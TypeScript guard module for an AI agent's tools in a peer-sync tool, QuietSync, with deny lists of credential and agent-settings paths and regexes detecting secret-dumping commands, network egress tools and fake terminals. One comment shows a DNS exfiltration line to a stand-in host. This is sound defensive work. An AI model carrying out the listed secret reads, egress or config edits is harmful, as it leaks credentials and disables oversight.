import { realpathSync } from 'node:fs'
import { homedir } from 'node:os'
import { basename, isAbsolute, resolve } from 'node:path'

// Local guard rails for the agent's own tools: which files and shell commands
// are off limits, which ones need a human while a peer is involved.

export type PathClass = 'quietsync-secret' | 'quietsync-config' | 'agent-config' | 'sensitive' | 'peer-content' | null

export const DEFAULT_PROTECT = [
  '**/.env',
  '**/.env.*',
  '!**/.env.example',
  '!**/.env.sample',
  '!**/.env.template',
  '**/*.pem',
  '**/*.key',
  '**/*.p12',
  '**/*.pfx',
  '**/*.jks',
  '**/*.keystore',
  '**/id_rsa*',
  '**/id_dsa*',
  '**/id_ecdsa*',
  '**/id_ed25519*',
  '~/.ssh/**',
  '~/.aws/**',
  '~/.azure/**',
  '~/.config/gcloud/**',
  '~/.config/gh/hosts.yml',
  '~/.kube/config',
  '~/.docker/config.json',
  '~/.gnupg/**',
  '~/.password-store/**',
  '~/.netrc',
  '~/.git-credentials',
  '~/.pypirc',
  '**/.npmrc',
  '~/.claude/.credentials.json',
  '~/.vault-token',
  '~/.config/hub',
  '~/.config/op/**',
  '~/.cargo/credentials*',
  '~/.gem/credentials',
  '~/.gradle/gradle.properties',
  '~/.m2/settings*.xml',
  '~/.composer/auth.json',
  // Shell history holds tokens people typed or pasted.
  '~/.zsh_history',
  '~/.bash_history',
  '~/.sh_history',
  '~/.history',
  '~/.local/share/fish/fish_history',
  '~/.python_history',
  '~/.node_repl_history',
  '~/.psql_history',
  '~/.mysql_history',
  '~/.irb_history',
  '~/Library/Keychains/**',
  '**/secrets/**',
  '**/.secrets/**',
  '**/*credentials*.json',
  '**/service-account*.json',
  '**/*.tfstate',
  '**/*.tfvars',
]

// The agent's own settings and plugins: whoever can edit them can switch off the
// hooks that enforce everything here.
export const AGENT_CONFIG = [
  '~/.claude/settings.json',
  '~/.claude/settings.local.json',
  '~/.claude/plugins/**',
  '~/.claude/hooks/**',
  '~/.claude.json',
  '**/.claude/settings.json',
  '**/.claude/settings.local.json',
  '~/.codex/config.toml',
  '~/.gemini/settings.json',
  '**/.gemini/settings.json',
]

// Keys and invites, plus anything holding peer text the human may not have
// accepted yet (session state, audit log): the agent reads none of it.
const QUIETSYNC_SECRET_FILES = new Set(['identity.json', 'invites.json', 'pending-pairs.json', 'claims.json', 'notes.json', 'records.json', 'rotations.json'])
const QUIETSYNC_SECRET_DIRS = ['run', 'sessions', 'audit', 'logs', 'journal']

const ci = process.platform === 'darwin' || process.platform === 'win32'

const slash = (p: string) => p.replace(/\\/g, '/')

export function globToRegExp(glob: string): RegExp {
  let g = slash(glob.trim())
  if (g.startsWith('~/') || g === '~') g = slash(homedir()) + g.slice(1)
  else if (!g.startsWith('/') && !/^[A-Za-z]:\//.test(g) && !g.startsWith('**')) g = `**/${g}`
  let re = ''
  for (let i = 0; i < g.length; i++) {
    const ch = g[i]!
    if (ch === '*') {
      if (g[i + 1] === '*') {
        i++
        if (g[i + 1] === '/') {
          i++
          re += '(?:.*/)?'
        } else re += '.*'
      } else re += '[^/]*'
    } else if (ch === '?') re += '[^/]'
    else re += ch.replace(/[.+^${}()|[\]\\]/g, '\\$&')
  }
  return new RegExp(`^${re}$`, ci ? 'i' : '')
}

export type PathGuard = {
  inbox?: string
  classify: (path: string, cwd?: string) => PathClass
  // For searches: does a root contain quietsync's folder or a protected location?
  reaches: (root: string, cwd?: string) => PathClass
  // Does a search starting here read files people sent?
  reachesInbox: (root: string, cwd?: string) => boolean
  home: string
}

const RANK: Record<string, number> = { 'quietsync-secret': 5, 'quietsync-config': 4, 'agent-config': 3, sensitive: 2, 'peer-content': 1 }
const worse = (a: PathClass, b: PathClass): PathClass => ((RANK[a ?? ''] ?? 0) >= (RANK[b ?? ''] ?? 0) ? a : b)

export function absPath(path: string, cwd = process.cwd()): string {
  const p = path.trim()
  const expanded = p === '~' ? homedir() : p.startsWith('~/') || p.startsWith('~\\') ? homedir() + p.slice(1) : p
  return slash(isAbsolute(expanded) ? resolve(expanded) : resolve(cwd, expanded))
}

function real(abs: string): string | null {
  try {
    return slash(realpathSync(abs))
  } catch {
    return null
  }
}

// Places that hold credentials as a whole; a search rooted at or above one reaches them.
const SENSITIVE_ROOTS = ['~/.ssh', '~/.aws', '~/.azure', '~/.config/gcloud', '~/.kube', '~/.docker', '~/.gnupg', '~/.password-store']

export function pathGuard(opts: { home: string; protect?: string[]; allow?: string[]; extraConfig?: string[]; inbox?: string }): PathGuard {
  const patterns = [...DEFAULT_PROTECT, ...(opts.protect ?? [])]
  const deny = patterns.filter(p => !p.startsWith('!')).map(globToRegExp)
  const agentConfig = AGENT_CONFIG.map(globToRegExp)
  const except = [...patterns.filter(p => p.startsWith('!')).map(p => p.slice(1)), ...(opts.allow ?? [])].map(globToRegExp)
  const home = slash(resolve(opts.home)).replace(/\/$/, '')
  const config = (opts.extraConfig ?? []).map(p => slash(resolve(p)))
  const eq = (a: string, b: string) => (ci ? a.toLowerCase() === b.toLowerCase() : a === b)
  const under = (p: string, dir: string) => eq(p, dir) || (ci ? p.toLowerCase().startsWith(`${dir.toLowerCase()}/`) : p.startsWith(`${dir}/`))
  const homeReal = real(home) ?? home
  const inbox = opts.inbox ? slash(resolve(opts.inbox)).replace(/\/$/, '') : null
  const inboxReal = inbox ? (real(inbox) ?? inbox) : ''
  const one = (abs: string): PathClass => {
    const base = under(abs, home) ? home : under(abs, homeReal) ? homeReal : null
    if (base) {
      const rel = abs.slice(base.length + 1)
      if (!rel) return 'quietsync-secret'
      if (QUIETSYNC_SECRET_FILES.has(rel) || QUIETSYNC_SECRET_DIRS.some(d => rel === d || rel.startsWith(`${d}/`))) return 'quietsync-secret'
      return 'quietsync-config'
    }
    if (config.some(c => eq(abs, c))) return 'quietsync-config'
    if (agentConfig.some(r => r.test(abs))) return 'agent-config'
    if (deny.some(r => r.test(abs)) && !except.some(r => r.test(abs))) return 'sensitive'
    if (inbox && (under(abs, inbox) || under(abs, inboxReal))) return 'peer-content'
    return null
  }
  const roots = SENSITIVE_ROOTS.map(r => absPath(r))
  // A symlink is judged by both its own path and where it points.
  const classify = (path: string, cwd = process.cwd()): PathClass => {
    if (!path) return null
    const abs = absPath(path, cwd)
    const r = real(abs)
    return r && r !== abs ? worse(one(abs), one(r)) : one(abs)
  }
  return {
    home,
    inbox: inbox ?? undefined,
    classify,
    reaches(root, cwd = process.cwd()) {
      const abs = absPath(root || '.', cwd)
      const r = real(abs) ?? abs
      const own = worse(classify(abs, cwd), classify(r, cwd))
      if (own) return own
      if (under(home, abs) || under(home, r) || under(homeReal, r)) return 'quietsync-secret'
      if (roots.some(x => under(x, abs) || under(x, r))) return 'sensitive'
      if (inbox && (under(inbox, abs) || under(inbox, r))) return 'peer-content'
      return null
    },
    reachesInbox(root, cwd = process.cwd()) {
      if (!inbox) return false
      const abs = absPath(root || '.', cwd)
      const r = real(abs) ?? abs
      return under(abs, inbox) || under(r, inboxReal) || under(inbox, abs) || under(inboxReal, r)
    },
  }
}

// Search patterns that name protected files (Grep's glob, Glob's pattern).
const SENSITIVE_PATTERN = /(^|[/*{,])\.env(\b|$)|id_(rsa|dsa|ecdsa|ed25519)|\.ssh\b|\.aws\b|\.azure\b|\.kube\b|\.gnupg\b|credentials|service-account|\.pem\b|\.p12\b|\.pfx\b|\.key\b|secrets?\b|\.npmrc|\.netrc|\.git-credentials|\.tfstate|\.tfvars|\.quietsync|identity\.json/i

export function searchTargets(tool: string, input: unknown): { root: string; pattern: string } | null {
  if (tool !== 'Grep' && tool !== 'Glob') return null
  const i = (input ?? {}) as Record<string, unknown>
  const root = typeof i.path === 'string' ? i.path : '.'
  const pattern = [i.glob, tool === 'Glob' ? i.pattern : undefined, i.type].filter(x => typeof x === 'string').join(' ')
  return { root, pattern }
}

export function sensitivePattern(pattern: string): boolean {
  return SENSITIVE_PATTERN.test(pattern)
}

export const SHELL_TOOLS = new Set(['Bash', 'PowerShell'])
export const WRITE_TOOLS = new Set(['Write', 'Edit', 'MultiEdit', 'NotebookEdit'])

// File paths a built-in tool call will read or write.
export function toolPaths(tool: string, input: unknown): string[] {
  const i = (input ?? {}) as Record<string, unknown>
  const out: string[] = []
  for (const k of ['file_path', 'notebook_path']) if (typeof i[k] === 'string') out.push(i[k] as string)
  if (tool === 'LS' && typeof i.path === 'string') out.push(i.path)
  return out
}

// QuietSync subcommands that only show things. Everything else from the shell
// is the human's job.
const CLI_READ_ONLY = 'whoami|contacts|sessions|doctor|help|version|status|--help|-h|--version|policy\\s+show|roles|rules(?:\\s+list)?\\s*(?=$|[;&|])|profile(?:\\s+(?:show|list))?\\s*(?=$|[;&|])'
const CONTROL = new RegExp(String.raw`(?:^|[\s;&|\x60(]|\$\()(?:\S*[\\/])?quietsync(?:\.m?js|\.cmd|\.exe)?["']?\s+(?!(?:${CLI_READ_ONLY})(?:\s|$|[;&|]))\S`, 'i')
const QUIETSYNC_DIR = /\.quietsync\b|quietsync[\\/]+(?:managed|run)\b|\bquietsync-[A-Za-z0-9_-]+\.sock\b/i
// Its private keys in the OS keychain count as its files.
const QUIETSYNC_KEYCHAIN = /\b(?:security|secret-tool)\b[^\n;&|]*\bquietsync\b/i

const SENSITIVE_SHELL: Array<[string, RegExp]> = [
  ['.env file', /(?:^|[\s"'=/\\])\.env(?:\.(?!example\b|sample\b|template\b)\w+)?(?=$|[\s"';|&)<>])/],
  ['ssh key', /\b(?:id_(?:rsa|dsa|ecdsa|ed25519)\w*|\.ssh[\\/])/],
  ['cloud credentials', /\.(?:aws|azure|kube|docker)[\\/]|gcloud[\\/]|\bcredentials\.json\b|service-account[\w-]*\.json/],
  ['key file', /\.(?:pem|p12|pfx|jks|keystore|key)\b(?![\w-])/],
  ['token file', /(?:^|[\s"'/\\])\.(?:npmrc|pypirc|netrc|git-credentials)\b|\bsecrets?[\\/]/],
  ['secret command', /\b(?:printenv|env\s*(?:$|[|>;&])|set\s*(?:$|[|>])|security\s+(?:find|dump)-\w+|gcloud\s+auth\s+(?:print-\w+-token|application-default\s+print)|aws\s+(?:configure\s+get|sts\s+get-session-token|ecr\s+get-login)|gh\s+auth\s+token|az\s+account\s+get-access-token|vault\s+(?:read|kv\s+get)|op\s+(?:read|item\s+get)|kubectl\s+get\s+secrets?|Get-ChildItem\s+env:|\$env:)|\/proc\/\S*environ/i],
]

const EGRESS = /\b(?:curl|wget|nc|ncat|netcat|socat|telnet|ssh|scp|sftp|rsync|ftp|http|https|xh|aria2c|Invoke-WebRequest|Invoke-RestMethod|iwr|irm|Send-MailMessage|sendmail|mail)\b|\bgit\s+(?:push|send-email)\b|\b(?:npm|pnpm|yarn|bun)\s+publish\b|\bgh\s+(?:api|gist|issue|pr|release|repo)\b|\b(?:aws\s+s3|gsutil|gcloud\s+storage|az\s+storage)\b|\b(?:python[\d.]*|node|bun|deno|ruby|perl|php)\s+(?:-[ce]|--eval)\b[^\n]*\b(?:urllib|requests|socket|http|fetch|net\b|Net::|curl)/i

// Fake terminals make a command look like a person is at the keyboard.
const PTY = /(?:^|[\s;&|(`])(?:script|unbuffer)\s+-|(?:^|[\s;&|(`])unbuffer\s|(?:^|[\s;&|(`])expect\s+-[cf]|\bpty\.(?:spawn|fork|openpty)|\bsocat\b[^\n]*\bpty\b|\bzpty\b/

// Lookups carry data out in the name they ask for (dig $(cat x | xxd -p).evil.example).
const DNS = /(?:^|[\s;&|(`])(?:dig|nslookup|host|drill|kdig|delv|ping|ping6)\s/

const AGENT_CONFIG_SHELL = /\.claude[\\/](?:settings(?:\.local)?\.json|plugins|hooks)\b|\.claude\.json\b|\.codex[\\/]config\.toml|\.gemini[\\/]settings\.json/

export type ShellCheck = { control: boolean; quietsyncFiles: boolean; agentConfig: boolean; sensitive: string | null; egress: boolean; peerContent: boolean; pty: boolean }

export function checkShell(command: string, home?: string, inbox?: string): ShellCheck {
  // Whole path components only: "/x/quietsync" must not match "/x/quietsync-inbox".
  const mentions = (dir: string) => [dir, slash(dir)].some(d => new RegExp(`${d.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}(?=$|[/\\\s"';|&)])`).test(command))
  const homeHit = home ? mentions(home) : false
  return {
    peerContent: /quietsync-inbox/.test(command) || (!!inbox && mentions(inbox)),
    control: CONTROL.test(command),
    quietsyncFiles: QUIETSYNC_DIR.test(command) || QUIETSYNC_KEYCHAIN.test(command) || homeHit,
    sensitive: SENSITIVE_SHELL.find(([, re]) => re.test(command))?.[0] ?? null,
    agentConfig: AGENT_CONFIG_SHELL.test(command),
    egress: EGRESS.test(command) || DNS.test(command),
    pty: PTY.test(command),
  }
}

export function shortPath(p: string, cwd: string): string {
  const s = slash(p)
  const c = slash(cwd).replace(/\/$/, '')
  if (s.startsWith(`${c}/`)) return s.slice(c.length + 1)
  const h = slash(homedir())
  return s.startsWith(`${h}/`) ? `~/${s.slice(h.length + 1)}` : basename(s) === s ? s : s
}
